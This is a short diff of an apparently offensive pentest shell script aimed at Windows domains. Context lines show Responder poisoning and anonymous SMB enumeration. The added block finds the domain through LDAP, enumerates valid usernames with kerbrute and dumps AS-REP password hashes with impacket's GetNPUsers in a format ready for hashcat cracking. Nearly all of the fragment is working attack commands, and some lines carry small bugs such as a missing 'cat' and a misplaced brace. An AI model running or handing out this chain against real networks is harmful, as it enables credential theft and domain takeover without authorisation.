@@ -40,3 +40,17 @@ responder -I eth0 > responder.txt &
 for IP in $(WIN_PORT445.txt); do
   smbclient -L "$IP" -N > smb-${IP}.txt
 done
+
+# Kerberoasting AS-REP 
+i=1
+for IP in $(cat WIN_PORT88.txt); do
+  DOMAIN=$(nmap $IP -p389 --script=ldap-rootdse | grep "defaultNamingContext" | cut -d"=" -f2 | sed 's/,DC=/./g')
+  
+  # a large userlist.txt that contains possible username 
+  ./kerbrute userenum -d "$DOMAIN" --dc "$IP" userlist.txt > valid_users.txt
+  
+  python3 -m impacket.GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -dc-ip "$IP" -no-pass -format hashcat -outputfile "asrep_hashes{$i}.txt" 
+  ((i++))
+done
+
+
